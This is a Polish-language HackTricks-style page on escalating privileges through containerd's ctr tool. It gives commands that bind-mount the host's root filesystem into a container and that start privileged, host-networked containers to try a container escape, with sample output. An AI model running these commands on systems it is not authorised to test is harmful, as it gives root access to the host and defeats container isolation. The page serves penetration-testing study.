# Eskalacja uprawnień w Containerd (ctr)

## Podstawowe informacje

Przejdź do poniższego linku, aby dowiedzieć się, **gdzie `containerd` i `ctr` znajdują się w stosie kontenerów**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Jeśli znajdziesz na hoście polecenie `ctr`, natywny CLI dołączony do containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Możesz wyświetlić obrazy znane dla containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Następnie **uruchom jeden z tych obrazów z katalogiem głównym hosta rekurencyjnie zamontowanym za pomocą bind mounta w katalogu głównym kontenera**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Uruchom kontener w trybie uprzywilejowanym i sprawdź możliwość escape.\
Możesz uruchomić uprzywilejowany kontener z użyciem sieci hosta jako:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` nadaje procesowi efektywne capabilities Linuksa wywołującego i usuwa kilka mechanizmów izolacji, ale escape nadal zależy od środowiska; użyj technik wymienionych na poniższej stronie, aby to przetestować:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Pierwsze kroki z containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementacja polecenia `ctr image`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementacja polecenia `ctr run`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Dokumentacja shared-subtree jądra Linuksa](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Pakiet OCI containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flagi polecenia `ctr` containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
